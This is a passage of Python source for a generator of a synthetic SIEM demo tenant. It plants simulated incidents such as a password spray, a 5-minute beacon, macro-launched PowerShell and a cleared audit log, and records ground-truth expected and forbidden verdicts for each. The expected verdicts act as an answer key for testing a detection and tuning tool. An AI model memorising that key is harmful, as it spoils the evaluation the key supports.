            entities=(("ip", "ip", BRUTE_FORCE_IP), ("host", "host", "srv-web-02")),
            details={
                "bursts": 5,
                "correlation_alerts": dict(brute["counts"]).get("5712", 0),
                "first_seen_fraction_of_window": round(
                    (brute_first - world.start_ms) / (world.now_ms - world.start_ms), 4
                ),
                "inside_noisy_rule": "5710, the same rule as the benign scanner (scenario b)",
            },
            **brute,
        ),
        PlantedScenario(
            id="e",
            key="trap.password_spray",
            category="noise_trap",
            title="Password spray from 198.51.100.23 against many accounts on dc01",
            expected_kinds=_NOISE_BLOCKED_KINDS,
            forbidden_kinds=("noise.tune",),
            allowed_verdicts=_NOISE_BLOCKED,
            rule_ids=("60122",),
            conditions=(("data.win.eventdata.ipAddress", SPRAY_IP),),
            agent="dc01",
            log_source="Security",
            must_not_hide=True,
            entities=(("ip", "ip", SPRAY_IP), ("host", "host", "dc01")),
            details={
                "distinct_users": len(stats.spray_users),
                "min_seconds_between_attempts": 35,
                "correlation_rule_60204_fired": "60204" in stats.rules,
                "tp_dispositions": dict(dispositions.get("e", {})),
            },
            **t.span("e"),
        ),
        PlantedScenario(
            id="f",
            key="trap.beacon",
            category="noise_trap",
            title="lap-007 beaconing to 192.0.2.77 every 5 minutes",
            expected_kinds=_NOISE_BLOCKED_KINDS,
            forbidden_kinds=("noise.tune",),
            expected_verdict="investigate",
            allowed_verdicts=_NOISE_BLOCKED,
            rule_ids=("92150",),
            conditions=(("agent.name", "lap-007"), ("data.win.eventdata.destinationIp", BEACON_IP)),
            agent="lap-007",
            log_source=_SYSMON_CHANNEL,
            must_not_hide=True,
            entities=(("host", "host", "lap-007"), ("ip", "ip", BEACON_IP)),
            details={
                "period_seconds": 300,
                "jitter_seconds": 4,
                "active": "only while the laptop is powered on",
                "share_of_rule": t.share("f", "92150"),
                "image": _winpath(rf"C:\Users\{beacon_owner}\AppData\Local\Temp\msupdate\updater.exe"),
            },
            **t.span("f"),
        ),
        PlantedScenario(
            id="g",
            key="trap.slow_burn",
            category="noise_trap",
            title="Internal host 10.30.0.99 probing srv-web-03 during the whole window, with a successful web attack",
            expected_kinds=("noise.investigate",),
            forbidden_kinds=("noise.tune",),
            expected_verdict="investigate",
            allowed_verdicts=_NOISE_BLOCKED,
            rule_ids=("31101", "31103", "31106"),
            conditions=(("data.srcip", SLOW_BURN_IP),),
            agent="srv-web-03",
            log_source="/var/log/nginx/access.log",
            must_not_hide=True,
            entities=(("ip", "ip", SLOW_BURN_IP), ("host", "host", "srv-web-03")),
            details={
                "share_of_rule": t.share("g", "31101"),
                "high_level_alerts": [_iso_ms(_dt(ms)) for ms in stats.high_alerts.get("31106", [])],
                "reason": "co-occurs with the level-12 rule 31106 on the same source IP",
            },
            **t.span("g"),
        ),
        PlantedScenario(
            id="h",
            key="trap.noisy_critical_rule",
            category="noise_trap",
            title="Noisy level-12 rule 92601: antivirus reading LSASS memory",
            expected_kinds=("noise.do_not_tune",),
            forbidden_kinds=("noise.tune",),
            expected_verdict="do_not_tune",
            allowed_verdicts=("do_not_tune",),
            rule_ids=("92601",),
            log_source=_SYSMON_CHANNEL,
            must_not_hide=True,
            entities=(("rule_id", "raw", "92601"),),
            details={
                "level": 12,
                "agents": sorted(h for h in windows_hosts if "10" in stats.codes.get((h, _SYSMON_CHANNEL), set())),
                "per_day": round(t.s.tag("h").count / window_days, 1),
                "source_image": _winpath(_AV_IMAGE),
            },
            **t.span("h"),
        ),
        PlantedScenario(
            id="s",
            key="trap.macro_powershell",
            category="noise_trap",
            title="A Word macro started encoded PowerShell on lap-003, hidden inside noisy process-creation rules",
            forbidden_kinds=("noise.tune",),
            allowed_verdicts=_NOISE_BLOCKED,
            rule_ids=("67027", "92001"),
            conditions=(("agent.name", "lap-003"), ("data.win.eventdata.commandLine", _MACRO.command)),
            agent="lap-003",
            must_not_hide=True,
            entities=(("host", "host", "lap-003"),),
            details={
                "image": _winpath(_MACRO.image),
                "parent_image": _winpath(_MACRO.parent),
                "why": "PowerShell also runs every hour from scheduled tasks, so a suggestion keyed on the "
                "interpreter's image path alone (or on the whole rule) would hide this execution",
            },
            **t.span("s"),
        ),
        PlantedScenario(
            id="i",
            key="silence.dc_tampering",
            category="silence",
            title="dc02 went silent right after its audit log was cleared",
            expected_kinds=("silence.tampering",),
            rule_ids=("63103",),
            conditions=(("agent.name", "dc02"),),
            agent="dc02",
            start=_dt(world.dc02_silence_ms),
            end=world.now,
            count=t.s.tag("i").count,
            counts=t.span("i")["counts"],
            entities=(("host", "host", "dc02"),),
            details={
                "last_event": _iso_ms(_dt(dc02[2])) if dc02[0] else None,
                "precursor_event_id": "1102",
                "precursor_at": _iso_ms(t.span("i")["start"]),
                "silent_hours": 30,
                "tier": "critical",
                "severity": "critical",
                # one incident, one finding: the tampering finding folds these in (listed as related, not repeated)
                "explains": ["pipeline.agent_no_data", "silence.unmonitorable"],
                "api_status": "active (fresh keepalive)",
                "mitre": ["T1070.001", "T1562.002"],
            },
        ),
        PlantedScenario(
            id="j",
            key="silence.sysmon_stopped",
            category="silence",
            title="The Sysmon channel stopped on srv-backup-01 while its Security channel keeps flowing",
            expected_kinds=("silence.silent", "silence.drop"),
            conditions=(("agent.name", "srv-backup-01"), ("data.win.system.channel", _SYSMON_CHANNEL)),
            agent="srv-backup-01",
            log_source=_SYSMON_CHANNEL,
            start=_dt(world.sysmon_stop_ms),
            end=world.now,
            count=sysmon[0],
            entities=(("host", "host", "srv-backup-01"),),
            details={
                "level": "agent_log_source",
                "last_sysmon_event": _iso_ms(_dt(sysmon[2])) if sysmon[0] else None,
                "security_last_event": _iso_ms(_dt(t.source("srv-backup-01", "Security")[2])),
            },
        ),
        PlantedScenario(
            id="k",
            key="silence.fw_field_lost",
            category="silence",
            title="fw-edge-01 stopped sending the destination port after a firmware upgrade",
            expected_kinds=("silence.field_lost",),
            rule_ids=("4101",),
            conditions=(("predecoder.hostname", "fw-edge-01"),),
            agent="fw-edge-01",
            log_source=FIREWALL_IP,
            start=_dt(world.fw_upgrade_ms),
            end=world.now,
            count=fw_before + fw_after,
            counts=(("4101", fw_before + fw_after),),
            entities=(("host", "host", "fw-edge-01"),),
            details={
                "field": "data.dstport",
                "upgrade_at": _iso_ms(_dt(world.fw_upgrade_ms)),
                "events_before": fw_before,
                "events_after": fw_after,
                "presence_before": round(fw_before_with / fw_before, 4) if fw_before else None,
                "presence_after": round(fw_after_with / fw_after, 4) if fw_after else None,
                "location": FIREWALL_IP,
                "agent_id": "000",
            },
        ),
        PlantedScenario(
            id="l",
            key="silence.heartbeat_rule_dark",
            category="silence",
            title="The twice-daily SCA summary stopped on srv-db-02 while the agent keeps sending other events",
            expected_kinds=("silence.rule_dark", "silence.silent"),
            rule_ids=("19004",),
            conditions=(("agent.name", "srv-db-02"),),
            agent="srv-db-02",
            log_source="sca",
            start=_dt(world.sca_stop_ms),
            end=world.now,
            count=t.s.tag("l").count,
            counts=t.span("l")["counts"],
            entities=(("host", "host", "srv-db-02"),),
            details={
                "heartbeat": "twice a day (02:xx and 14:xx UTC) on every Linux server",
                "last_heartbeat": _iso_ms(t.span("l")["end"]),
                "agent_still_alive": t.host("srv-db-02")[2] >= world.now_ms - _HOUR_MS,
                "rule_still_fires_on": sorted(
                    h
                    for h in t.names("web", "db", "legacy")
                    if h != "srv-db-02" and t.source(h, "sca")[2] >= world.sca_stop_ms
                ),
                "note": "dark for (rule 19004, agent srv-db-02) while the rule keeps firing on the other servers; "
                "the SCA summary is the only event of the (srv-db-02, sca) log source, so a SILENT finding on that "
                "agent log source is an equally correct detection",
            },
        ),
        PlantedScenario(
            id="r",
            key="silence.rule_format_changed",
            category="silence",
            title="Rule 5502 stopped matching on every Linux host after a PAM message format change",
            expected_kinds=("silence.rule_dark",),
            rule_ids=("5502",),
            start=_dt(world.pam_change_ms),
            end=world.now,
            count=t.s.tag("r").count,
            counts=t.span("r")["counts"],
            entities=(("rule_id", "raw", "5502"),),
            details={
                "last_match": _iso_ms(t.span("r")["end"]),
                "agents": t.names("manager", "web", "db"),
                "sources_alive": "rule 5501 keeps firing on the same log files (/var/log/auth.log, /var/log/secure)",
                "cause": "an OS update changed the pam_unix 'session closed' line; the events still arrive but no "
                "longer match the rule",
            },
        ),
        PlantedScenario(
            id="m",
            key="silence.laptops_off_hours",
            category="silence",
            title="Laptops powered off at night, on weekends and on the holiday (no finding expected)",
            forbidden_kinds=_SILENCE_KINDS,
            start=world.start,
            end=world.now,
            count=sum(t.host(n)[0] for n in t.names("laptop")),
            details={
                "agents": t.names("laptop"),
                "holiday": world.holiday.isoformat(),
                "on_hours": "weekdays, about 07:45 to 19:00 local time",
                "events_outside_on_hours": stats.laptop_off_hours,
                "tier": "low",
            },
        ),
        PlantedScenario(
            id="q",
            key="silence.no_false_alarms",
            category="silence",
            title="Every other source keeps its normal rhythm (no silence finding expected)",
            forbidden_kinds=_SILENCE_KINDS,
            start=world.start,
            end=world.now,
            details={
                "silence_findings_only_about": ["dc02", "srv-backup-01", "fw-edge-01", "srv-db-02", "srv-legacy-01"],
                "note": "a silence finding about any other agent or log source is a false alarm",
            },
        ),
        PlantedScenario(
            id="n",
            key="coverage.no_sysmon",
            category="coverage",
            title="srv-app-01 never sent Sysmon events while its Windows peers do",
            expected_kinds=("coverage.missing_source",),
            conditions=(("agent.name", "srv-app-01"),),
            agent="srv-app-01",
            log_source=_SYSMON_CHANNEL,
            count=t.source("srv-app-01", "Security")[0],
            entities=(("host", "host", "srv-app-01"),),
            details={
                "peers_with_sysmon": sum(1 for h in windows_hosts if t.source(h, _SYSMON_CHANNEL)[0]),
                "windows_hosts": len(windows_hosts),
                "contract": "windows servers",
            },
        ),
        PlantedScenario(
            id="o",
            key="coverage.no_4688",
            category="coverage",
            title="srv-app-02 logs logons (4624) but never process creation (4688)",
            expected_kinds=("coverage.missing_event_type",),
            conditions=(("agent.name", "srv-app-02"),),
            agent="srv-app-02",
            log_source="Security",
            count=t.source("srv-app-02", "Security")[0],
            entities=(("host", "host", "srv-app-02"),),
            details={
                "present": sorted(stats.codes.get(("srv-app-02", "Security"), set())),
                "missing": ["4688"],
                "peers_with_4688": sum(1 for h in windows_hosts if "4688" in stats.codes.get((h, "Security"), set())),
                "windows_hosts": len(windows_hosts),
            },
        ),
        PlantedScenario(
            id="p1",
            key="pipeline.disconnected",
            category="pipeline",
            title="Agent srv-legacy-01 has been disconnected for days",
            expected_kinds=("pipeline.agent_disconnected",),
            conditions=(("agent.name", "srv-legacy-01"),),
            agent="srv-legacy-01",
            start=_dt(world.legacy_stop_ms),
            end=world.now,
            count=legacy[0],
            entities=(("host", "host", "srv-legacy-01"),),
            details={
                "api_status": "disconnected",
                "last_event": _iso_ms(_dt(legacy[2])) if legacy[0] else None,
                "also_acceptable": ["silence.silent"],
            },
        ),
        PlantedScenario(
            id="p2",
            key="pipeline.never_connected",
            category="pipeline",
            title="Agent srv-new-01 was enrolled but never connected",
            expected_kinds=("pipeline.agent_disconnected",),
            conditions=(("agent.name", "srv-new-01"),),
            agent="srv-new-01",
            entities=(("host", "host", "srv-new-01"),),
            details={"api_status": "never_connected"},
        ),
        PlantedScenario(
            id="p3",
            key="pipeline.alive_no_data",
            category="pipeline",
            title="Agent srv-mon-01 is active (fresh keepalive) but sends no events",
            expected_kinds=("pipeline.agent_no_data",),
            conditions=(("agent.name", "srv-mon-01"),),
            agent="srv-mon-01",
            entities=(("host", "host", "srv-mon-01"),),
            details={"api_status": "active", "events": 0},
        ),
    ]
    for sid, key, title, rule_id, kinds, parent, reasons in _TUNING_DEBT:
        out.append(
            PlantedScenario(
                id=sid,
                key=key,
                category="tuning",
                title=title,
                expected_kinds=kinds,
                forbidden_kinds=() if kinds else ("tuning.risky_suppression", "tuning.expired"),
                rule_ids=(rule_id,),
                entities=(("rule_id", "raw", rule_id),),
                details={"file": _LOCAL_RULES, "parent": parent, "reasons": list(reasons)},
            )
        )
    return out


# ---- entry point -------------------------------------------------------------------------------------------------


def generate(
    out_dir: Path,
    *,
    seed: int = 7,
    days: int = 21,
    now: datetime | None = None,
    agents: int = 40,
    scale: float = 1.0,
) -> DemoManifest:
    """Write the synthetic demo tenant into ``out_dir`` and return its manifest (ground truth included).

    * ``seed`` — every random choice derives from it (same arguments, byte-identical files).
    * ``days`` — window length (10-90); the planted scenarios need the last 10 days.
    * ``now`` — end of the window (timezone-aware). Defaults to :data:`DEFAULT_NOW`, never the wall clock.
    * ``agents`` — approximate fleet size; laptops fill it (``agents - 20``, at least 8).
    * ``scale`` — multiplies background volumes (0.05-20); planted scenarios are never scaled.

    Existing demo files in ``out_dir`` are overwritten; ``alerts.json`` is written to a temporary name first and
    renamed when complete. Raises ``ValueError`` on invalid arguments.
    """
    if isinstance(seed, bool) or not isinstance(seed, int):
        raise ValueError("seed must be an integer")
    if isinstance(days, bool) or not isinstance(days, int) or not MIN_DAYS <= days <= MAX_DAYS:
        raise ValueError(f"days must be an integer between {MIN_DAYS} and {MAX_DAYS}")
    if isinstance(agents, bool) or not isinstance(agents, int) or not 1 <= agents <= 500:
        raise ValueError("agents must be an integer between 1 and 500")
    if isinstance(scale, bool) or not isinstance(scale, (int, float)) or not 0.05 <= float(scale) <= 20.0:
        raise ValueError("scale must be a number between 0.05 and 20")
    if now is None:
        now = DEFAULT_NOW
    elif now.tzinfo is None or now.utcoffset() is None:
        raise ValueError("now must be timezone-aware")
    now = now.astimezone(UTC).replace(microsecond=0)
    if not 2001 <= now.year <= 2199:
        raise ValueError("now must be between the years 2001 and 2199")
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    world = _World(seed=seed, days=days, now=now, n_laptops=max(8, agents - 20), scale=float(scale))
    texts = _rule_texts(now)
    rules_dir = out / RULES_DIR
    _write_rules(rules_dir, texts)
    alerts_path = out / ALERTS_FILE
    stats = _write_alerts(alerts_path, world, _parse_rules(texts))
    agents_path = out / AGENTS_FILE
    _write_agents(agents_path, world)
    dispositions_path = out / DISPOSITIONS_FILE
    disposition_summary = _write_dispositions(dispositions_path, world, stats)
    config_path = out / CONFIG_FILE
    _write_private(config_path, _config_text(world))  # configs can hold credentials: 0600, like doctor expects
    manifest = DemoManifest(
        out_dir=out,
        alerts_path=alerts_path,
        rules_dir=rules_dir,
        agents_path=agents_path,
        dispositions_path=dispositions_path,
        config_path=config_path,
        manifest_path=out / MANIFEST_FILE,
        ground_truth=_ground_truth(world, stats, disposition_summary),
        seed=seed,
        days=days,
        scale=float(scale),
        agents=agents,
        now=now,
        start=world.start,
        timezone=TIMEZONE,
        tenant=TENANT_NAME,
        holiday=world.holiday,
        alerts=stats.total,
        rule_counts=dict(stats.rules),
        agent_names=[a.name for a in world.fleet],
    )
    manifest.manifest_path.write_text(
        json.dumps(manifest.to_dict(), indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
    )
    return manifest
